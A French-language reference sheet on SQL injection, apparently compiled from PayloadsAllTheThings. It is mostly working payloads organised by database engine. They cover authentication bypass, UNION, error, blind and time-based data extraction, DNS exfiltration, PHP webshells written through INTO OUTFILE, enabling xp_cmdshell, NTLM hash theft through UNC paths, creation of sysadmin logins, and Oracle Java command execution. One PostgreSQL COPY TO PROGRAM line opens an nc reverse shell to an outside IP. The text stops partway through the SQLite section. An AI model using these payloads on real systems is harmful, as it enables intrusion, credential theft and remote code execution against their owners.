---
title: "Injection SQL"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# Injection SQL (SQLi)

> [!info] **En 1 phrase**
> SQLi = injecter du code SQL dans une requête en manipulant les **entrées utilisateur** mal filtrées
> → lecture/écriture de la base, bypass d'authentification, parfois **RCE** sur le serveur.
>
> Source principale : **[PayloadsAllTheThings (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)**

---

## Concept

```mermaid
flowchart LR
    A[Entrée utilisateur<br>?id=1' OR '1'='1] --> B[Requête SQL<br>construite dynamiquement]
    B --> C[Requête modifiée<br>exécutée par la BDD]
    C --> D[Données volées]
    C --> E[Bypass auth]
    C --> F[Lecture fichiers]
    C --> G[RCE serveur]
```

> [!info] **Pourquoi ça marche**
> Quand l'app concatène l'entrée dans une requête sans **paramétrage**
> (`SELECT * FROM users WHERE id = $_GET['id']`), on peut "sortir" du champ attendu et
> **réécrire** le reste de la requête.

---

## Détection du point d'injection

```bash
# Caractères déclencheurs (sur champs string)
'   "   ;   )   *
# Encodés
%27  %22  %23  %3B  %29  %2A
# Double encodage
%%2727  %25%27
# Unicode qui se transforment en quote après normalisation
%CA%BA  → "    # U+02BA MODIFIER LETTER DOUBLE PRIME
%CA%B9  → '    # U+02B9 MODIFIER LETTER PRIME

# Tests logiques (tautologie)
page.asp?id=1 or 1=1     # true
page.asp?id=1' or 1=1 -- # true
page.asp?id=1" or 1=1 -- # true
page.asp?id=1 and 1=2 -- # false  → différent de la vraie page = injectable

# Timing
page.asp?id=1' AND SLEEP(5)--   # réponse lente = injectable

# Fusion de chaînes (contexte string)
'+herp
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

---

## Identification du SGBD (DBMS)

> [!tip] **Première chose à faire** : savoir si on est sur MySQL, MSSQL, PostgreSQL, Oracle ou SQLite.
> Chaque moteur a ses fonctions et sa méthodo. Le mot-clé qui marche = celui du bon SGBD.

### Keyword based (true/false)

| DBMS | Payload |
|---|---|
| MySQL | `conv('a',16,2)=conv('a',16,2)` / `connection_id()=connection_id()` / `crc32('MySQL')=crc32('MySQL')` |
| MSSQL | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` / `@@CONNECTIONS>0` / `USER_ID(1)=USER_ID(1)` |
| Oracle | `ROWNUM=ROWNUM` / `RAWTOHEX('AB')=RAWTOHEX('AB')` / `LNNVL(0=123)` |
| PostgreSQL | `5::int=5` / `pg_client_encoding()=pg_client_encoding()` / `current_database()=current_database()` |
| SQLite | `sqlite_version()=sqlite_version()` / `last_insert_rowid()>1` |
| MS Access | `val(cvar(1))=1` / `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |

### Error based (messages d'erreur)

| DBMS | Erreur typique | Payload |
|---|---|---|
| MySQL | `You have an error in your SQL syntax; ... near '' at line 1` | `'` |
| PostgreSQL | `ERROR: unterminated quoted string at or near "'"` | `'` |
| MSSQL | `Unclosed quotation mark after the character string ''.` | `'` |
| Oracle | `ORA-00933: SQL command not properly ended` | `'` |

---

## Authentication Bypass

```sql
-- Requête initiale
SELECT * FROM users WHERE username = 'user' AND password = 'pass';

-- Bypass total
' OR '1'='1'--
-- → SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';

-- Loggé en premier utilisateur (évite les problèmes de résultats multiples)
' or 1=1 limit 1 --

-- Jamais de payload toujours-vrai sur des endpoints qui suppriment/modifient !
--    Il peut matcher des sessions, fichiers, configs...

-- Bypass MD5 raw (PHP md5($password, true))
-- "ffifdyop"  → md5 raw =  'or'6�]... → SELECT * FROM admin WHERE pass = ''or'6...
-- "129581926211651571912466741651878684928" → contient 'or'
-- "3fDf" (sha1) → contient '='

-- Bypass avec hash (mot de passe haché)
-- L'app stocke MD5(P@ssw0rd) = 161ebd7d45089b3446ee4e0d86dbcf92
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```

---

## UNION Based

> [!warning] **Règle d'or** : les deux `SELECT` doivent avoir **le même nombre de colonnes**.

```sql
-- Requête initiale
SELECT product_name, product_price FROM products WHERE product_id = 'input';
-- Injection
1' UNION SELECT username, password FROM users --
```

### Compter les colonnes

```sql
-- Méthode itérative NULL
UNION SELECT NULL;--
UNION SELECT NULL, NULL;--
UNION SELECT NULL, NULL, NULL;--

-- Méthode ORDER BY / GROUP BY (incrémente jusqu'à l'erreur)
ORDER BY 1--+    → true
ORDER BY 2--+    → true
ORDER BY 3--+    → true
ORDER BY 4--+    → false  → 3 colonnes
-1' UNION SELECT 1,2,3--+

-- Méthode LIMIT INTO (si injection après un LIMIT)
1' LIMIT 1,1 INTO @--+          → erreur
1' LIMIT 1,1 INTO @,@--+        → erreur
1' LIMIT 1,1 INTO @,@,@--+      → OK → 3 colonnes
```

### Extraction (MySQL)

```sql
-- Databases
UNION SELECT 1,2,3,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
-- Tables
UNION SELECT 1,2,3,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=DB
-- Colonnes
UNION SELECT 1,2,3,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=T
-- Données
UNION SELECT 1,2,3,...,GROUP_CONCAT(0x7c,data,0x7C) FROM TABLE
```

### Sans information_schema (quand il est filtré)

```sql
-- MySQL >= 4.1
(1)and(SELECT * from db.users)=(1)            -- "Operand should contain 4 column(s)"
1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)  -- "Column 'id' cannot be null"
-- MySQL 5
UNION SELECT * FROM (SELECT * FROM users JOIN users b)a                    -- "Duplicate column name 'id'"
UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a          -- "Duplicate column name 'name'"

-- Alternative : innodb_table_stats
SELECT * FROM mysql.innodb_table_stats;    -- database_name, table_name...
```

---

## Error Based

### MySQL

```sql
AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -        -- >= 5.1
AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -

-- Court et efficace
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -

-- Variantes supplémentaires
-- NAME_CONST (constantes, >= 5.0)
AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
-- UUID_TO_BIN (>= 8.0)
AND UUID_TO_BIN(version())='1
-- Error based basique >= 4.1 (ROW + COUNT + FLOOR(RAND))
AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))-- -
-- Contourner VERSION() bloquée
UNION SELECT @@innodb_version,-- -
UNION SELECT @@GLOBAL.VERSION,-- -
```

### MSSQL

```sql
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
CAST((SELECT @@version) AS INT)
' + convert(int,@@version) + '
-- Variante EQUAL
AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
-- Variantes avec parenthèses
ProductID=1);waitfor delay '0:0:5';-- / ProductID=1))waitfor...--
```

### PostgreSQL

```sql
AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -
AND CAST((SELECT version()) AS INT)=1337 -- -
-- Extraction
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) as int) and '1'='1
-- Variante CAST supplémentaire
AND (SELECT version())::int=1 -- -
```

### Oracle

```sql
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual
AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(SELECT banner FROM v$version)||'~'||CHR(62))) FROM DUAL) -- -
AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -
-- Point d'injection dans une string : '||PAYLOAD--

-- Variantes supplémentaires
-- ordsys.ord_dicom.getmappingxpath (Invalid XPath)
SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version),user,user) FROM dual
-- dbms_xmlgen.getxml + to_char
SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual
-- XDBURITYPE .getblob() / .getclob()
SELECT XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() FROM dual
-- NVL + CAST + ROWNUM
SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT * FROM ALL_USERS WHERE ROWNUM=1)
-- rtrim(extract(xmlagg(xmlelement...)))
SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users
-- XMLType + REPLACE pour neutraliser les caractères spéciaux
AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),',','_')||CHR(62))) FROM DUAL) -- -
```

---

## Blind (boolean / error / time)

### Boolean based (MySQL)

```sql
-- Confirm
?id=1 AND 1=1 --   → normal
?id=1 AND 1=2 --   → différent (ou erreur)

-- Taille + caractères (dichotomie pour aller plus vite)
?id=1 AND LENGTH(@@hostname)=N --
?id=1 AND ASCII(SUBSTRING(@@hostname,1,1)) > 64 --
?id=1 AND ASCII(SUBSTRING(@@hostname,1,1)) = 104 --
```

### Blind error based (SQLite)

```sql
-- json('') provoque une erreur si la condition est fausse → oracle
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A   -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A   -- malformed JSON
```

### Time based

```sql
-- MySQL
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --    (MSSQL)
? (MSSQL) ;waitfor delay '0:0:10'--
-- Heavy queries (quand SLEEP est bloqué)
BENCHMARK(2000000,MD5(NOW()))
-- Extraction
?id=1 AND IF(SUBSTRING(VERSION(),1,1)='5', BENCHMARK(1000000, MD5(1)), 0) --

-- Variantes WAF bypass (SLEEP)
' OR RLIKE SLEEP(5)-- -
' OR ELT(1=1,SLEEP(5))-- -
' XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR' -- -
' AND SLEEP(10)=0-- -
' AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)-- -
' +BENCHMARK(40000000,SHA1(1337))+'
-- Extraction par timing dans un sous-select (pas boolean) :
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#   -- taille
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__x')#  -- caractères

-- PostgreSQL
select 1 from pg_sleep(5)
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
-- Extraction conditionnelle
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
-- Variantes si PG_SLEEP bloqué
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))          -- heavy query
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
;(select 1 from pg_sleep(5))-- - / ||(select 1 from pg_sleep(5))-- -
-- Extraction tables/colonnes par timing
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1

-- Oracle
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

### Fonctions SUBSTRING équivalentes (blind)

| Moteur | Fonctions |
|---|---|
| MySQL | `SUBSTR`, `SUBSTRING`, `RIGHT(LEFT(x,1),1)`, `MID`, `LEFT` |
| MSSQL | `SUBSTRING` |
| PostgreSQL | `SUBSTR`, `SUBSTRING`, `SUBSTRING(x FROM s FOR l)` |
| Oracle | `SUBSTR` |

### Autres méthodes MySQL blind

```sql
-- MAKE_SET
AND MAKE_SET(VALUE<(SELECT(length(version()))),1)
-- LIKE
SELECT * FROM products WHERE product_name LIKE '%user_input%'    -- % = n'importe quoi, _ = 1 char
-- REGEXP
' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --   longueur
' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --   premier caractère
```

---

## Out-of-Band (OAST)

> [!tip] **Quand les réponses sont invisibles/instables** : on exfiltre par **DNS/HTTP** vers
> un Burp Collaborator ou Interactsh. Utilise `BURP-COLLABORATOR-SUBDOMAIN` comme placeholder.

```sql
-- MySQL : LOAD_FILE / INTO OUTFILE vers UNC
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'

-- MSSQL
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
-- MSSQL DNS exfil (avec CONTROLLER SERVER)
1 and exists(select * from fn_get_audit_file('\\'+(select pass from users where id=1)+'.DOMAIN\',default,default))
-- MSSQL DNS exfil (fn_xe_file_target_read_file — VIEW SERVER STATE)
fn_xe_file_target_read_file('C:\*.xel','\\'+(select pass from users where id=1)+'.[DOMAIN]\1.xem',null,null)
-- MSSQL DNS exfil (fn_trace_gettable — CONTROL SERVER)
fn_trace_gettable('\\'+(select pass from users where id=1)+'.[DOMAIN]\1.trc',default)

-- PostgreSQL (via COPY)
declare c text; declare p text; begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c; END; $$ language plpgsql security definer; SELECT f();

-- Oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

---

## Stacked Queries (requêtes multiples)

> [!warning] Non supporté par toutes les BDD/API. **Toujours tester.**

```sql
-- MSSQL
ProductID=1; DROP members--
SELECT 'A'SELECT 'B'SELECT 'C'            -- sans terminateur
-- Activer xp_cmdshell via stacked query
'admin'exec('sp_configure ''show advanced option'',''1''reconfigure')exec('sp_configure ''xp_cmdshell'',''1''reconfigure')--
-- Délai
ProductID=1;waitfor delay '0:0:10'--

-- PostgreSQL
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

---

## MySQL — fichier & commandes

```sql
-- Lire un fichier (nécessite FILE privilege)
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;  -- si root BDD

-- Webshell OUTFILE
UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -

-- Webshell DUMPFILE
UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';

-- RCE via UDF (lib_mysqludf_sys)
-- Si /usr/lib/lib_mysqludf_sys.so existe :
SELECT sys_eval('id');

-- INSERT injection (reset mot de passe admin)
-- payload champ email :
attacker@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --

-- Truncation attack (varchar(20)) : "admin  <espaces pour dépasser 20 chars>"
-- Le surplus est coupé → on crée un user "admin" quand admin existe déjà

-- NTLM hash stealing (UNC path)
SELECT LOAD_FILE('\\\\error\\abc');
SELECT '' INTO OUTFILE '\\\\error\\abc';
-- Variantes hex + DUMPFILE + LOAD DATA INFILE
SELECT LOAD_FILE(0x5c5c5c5c...);                        -- UNC en hex
SELECT '...' INTO DUMPFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
-- DNS exfil par CONCAT (nom DNS = valeur extraite)
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
```

### DIOS — Dump in One Shot (extraction massive en 1 requête)

> Tout extraire d'un coup via des variables utilisateur `@`. Technique SecurityIdiots / Profexer / M@dBl00d.

```sql
SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns)
WHERE (table_schema>=@) AND (@)IN (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a) AS ...
```

### Énumération avancée (MySQL)

```sql
-- Compter les colonnes en 1 requête (si erreurs visibles)
ORDER BY 1,2,3,...,100--+    → "Unknown column '4' in 'order clause'" → 3 colonnes
-- Détection numérique
AND 1 / AND 0 / 1-false→1 / 1-true→0 / 1*56→56
-- Tests string (bypass / détection) :  \  → False   |   \\  → True

-- json_arrayagg : alternative à GROUP_CONCAT (>= 5.7.22, pas de limite 1024)
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) FROM INFORMATION_SCHEMA.TABLES;

-- Current Queries : lire les requêtes en cours des autres sessions
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- Extraction sans connaître les noms de colonnes
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;

-- MAKE_SET : variantes
AND MAKE_SET(1,1) AND MAKE_SET(VALUE,(length(version()))=1)
-- REGEXP chiffres
' OR (SELECT username FROM users WHERE username REGEXP '^[0-9]') --
```

---

## MSSQL — énumération & commandes

```sql
-- Énumération
SELECT @@version
SELECT DB_NAME()                      -- database courante
SELECT HOST_NAME(), @@hostname, @@SERVERNAME
SELECT CURRENT_USER, user_name(), system_user
-- Databases
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N);                     -- par index
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;  -- MSSQL 2017+
-- Tables (xtype='U' tables, 'V' views)
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT table_name FROM information_schema.tables WHERE table_catalog='DB'
-- Colonnes
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users');

-- Lecture fichier (permission BULK ADMIN)
-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null

-- Écriture fichier (via procédure non documentée)
EXECUTE spWriteStringToFile 'contenu', 'C:\path\to\', 'file.txt'

-- Vecteurs UNC / NTLM hash stealing supplémentaires
1'; exec master..xp_fileexist '\\10.10.10.10\file';--
BACKUP LOG [TESTING] TO DISK = '\\10.10.10.10\file'
BACKUP DATABASE [TESTING] TO DISK = '\\10.10.10.10\file'
RESTORE LOG [TESTING] FROM DISK = '\\10.10.10.10\file'
RESTORE HEADERONLY / FILELISTONLY / LABELONLY / VERIFYONLY FROM DISK = '\\10.10.10.10\file'

-- RCE : xp_cmdshell (désactivé par défaut)
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
-- Réactivation
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- RCE alternative : sp_execute_external_script (Python)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'   -- lecture fichier

-- NTLMv2 hash stealing (xp_dirtree)
1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';--

-- Trusted Links (pivot SQL→SQL, même via forest trusts !)
select * from master..sysservers
select version from openquery("linkedserver", 'select @@version as version')
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
-- Exec à travers le lien
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
-- Créer un login sysadmin à travers les liens
EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"

-- Privilèges
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT');
SELECT is_srvrolemember('sysadmin');
EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';   -- escalade

-- Blind : extraction longueur / caractères
AND LEN((SELECT TOP 1 username FROM tblusers))=5
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
-- Blind : pagination sans LIMIT (ROW_NUMBER)
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
  SELECT message FROM data WHERE row = 1 and message like 't%'

-- Time based conditionnel
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'

-- Stacked : update mot de passe sans quote
SELECT ... WHERE username = 'admin'exec('update[users]set[password]=''a''')--

-- Hashes (mssql)
SELECT name, password_hash FROM master.sys.sql_logins   -- hashcat 132
SELECT name, password FROM master..sysxlogins           -- MSSQL 2000, hashcat 131

-- OPSEC : sp_password masque la requête dans les logs !
' AND 1=1--sp_password
```

---

## PostgreSQL — fichiers & commandes

```sql
-- Énumération
SELECT version(), current_database(), current_schema()
SELECT usename FROM pg_user
SELECT usename, passwd FROM pg_shadow                    -- hashes !
SELECT datname FROM pg_database
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT DISTINCT(schemaname) FROM pg_tables                -- tous les schémas
SELECT usename FROM pg_user WHERE usesuper IS TRUE        -- superusers
SELECT getpgusername(), session_user
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER -- suis-je superuser ?
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user
  AND table_schema NOT IN ('pg_catalog','information_schema')  -- mes droits
-- XML helpers (dump tout d'un coup)
SELECT query_to_xml('select * from pg_user',true,true,'');
SELECT database_to_xml(true,true,'');
SELECT database_to_xmlschema(true,true,'');

-- Lecture fichier
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;
SELECT lo_import('/etc/passwd');    -- → OID
SELECT lo_get(<OID>);

-- Écriture fichier
CREATE TABLE nc (t TEXT); INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
COPY nc(t) TO '/tmp/nc.sh';
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
-- Écriture via Large Objects (alternative à COPY)
SELECT lo_from_bytea(43210, 'contenu du fichier');
SELECT lo_put(43210, 20, 'suite du contenu');
SELECT lo_export(43210, '/tmp/testexport');
SELECT * from pg_largeobject;    -- lister tous les OIDs

-- RCE : COPY TO PROGRAM (superuser ou pg_execute_server_program)
COPY (SELECT '') TO PROGRAM 'nslookup ATTACKER'
CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';

-- RCE : libc
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc IP PORT');

-- WAF bypass quotes
SELECT CHR(65)||CHR(66)||CHR(67);      -- 'ABC'
SELECT $$NoQuote$$;                     -- dollar-quoted (>= 8)

-- Superuser ?
SHOW is_superuser; SELECT current_setting('is_superuser');
```

---

## Oracle — commandes

```sql
-- Énumération
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE ROWNUM=1;             -- + 'TNS%' / UTL_INADDR.get_host_name/get_host_address
SELECT global_name FROM global_name;                     -- nom de la BDD
SELECT instance_name FROM v$instance;                    -- instance
SELECT SYS.DATABASE_NAME FROM DUAL;
SELECT sys_context('USERENV','CURRENT_SCHEMA') FROM dual;
SELECT host_name FROM v$instance;
SELECT name FROM v$database;
-- Hashs des mots de passe (privilégié)
SELECT name, password FROM sys.user$;                    -- <= 10g
SELECT name, spare4 FROM sys.user$;                      -- <= 11g
SELECT username FROM all_users;
-- Recherche de colonnes / databases
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
SELECT DISTINCT owner FROM all_tables;

-- RCE via DBMS_JAVA_TEST.FUNCALL (10g R2, 11g)
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
-- Variante Windows
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','dir >c:\test.txt') FROM dual
-- RCE via DBMS_JAVA.RUNJAVA (11g)
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
-- Package os_command
SELECT os_command.exec_clob('<COMMAND>') cmd from dual
-- DBMS_SCHEDULER
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)

-- RCE robuste : classe Java "PwnUtil" (runCmd / readFile)
-- Grants préalables (nécessaires au RCE) :
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
EXEC dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor','*');
EXEC dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor','*');
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "PwnUtil" AS
import java.io.*;
public class PwnUtil {
  public static String runCmd(String args) throws IOException {
    String result = "";
    Process process = Runtime.getRuntime().exec(args);
    BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line; while ((line = in.readLine()) != null) result += line + "\n";
    return result;
  }
  public static String readFile(String file) throws IOException {
    String result = "";
    BufferedReader in = new BufferedReader(new FileReader(file));
    String line; while ((line = in.readLine()) != null) result += line + "\n";
    return result;
  }
};
CREATE OR REPLACE FUNCTION PwnUtilFunc(p_cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'PwnUtil.runCmd(java.lang.String) return java.lang.String';
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
-- Variante hex-encodée (bypass WAF) : encodage via hextoraw()
SELECT PwnUtilFunc(UTL_RAW.CAST_TO_VARCHAR2(hextoraw('...'))) FROM dual;
-- Liste des privilèges Java
SELECT * FROM dba_java_policy; SELECT * FROM user_java_policy;

-- Lecture/écriture fichier (stacked query uniquement)
utl_file.get_line(utl_file.fopen('/path/','file','R'), <buffer>)
utl_file.put_line(utl_file.fopen('/path/','file','R'), <buffer>)

-- Blind (méthodo Oracle)
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';   -- 1re ligne

-- Outil : odat (Oracle Database Attacking Tool)
odat all -s TARGET -p 1521 -d XE
```

---

## SQLite

> SQLite = base **embarquée** (fichier unique). Pas de fonctions `SLEEP`, pas de requêtes multiples classiques
> mais des fonctions dédiées (`load_extension`, `writefile`, `ATTACH DATABASE`) très puissantes.

### Identification

```sql
-- Déclenche une erreur contenant le numéro de version
AND 1=1 AND (SELECT 1 FROM sqlite_master) ;--
' AND 1=1 AND ROWID=1 ;--
AND json('') --   → "malformed JSON" (ou autre fonction inexistante → erreur = SQLite)
```

### Énumération (sqlite_master)

```sql
-- Structure SQL de la base (créations de tables)
SELECT sql FROM sqlite_schema;                 -- >= 3.33 (sinon sqlite_master)
-- Toutes les tables (concaténées)
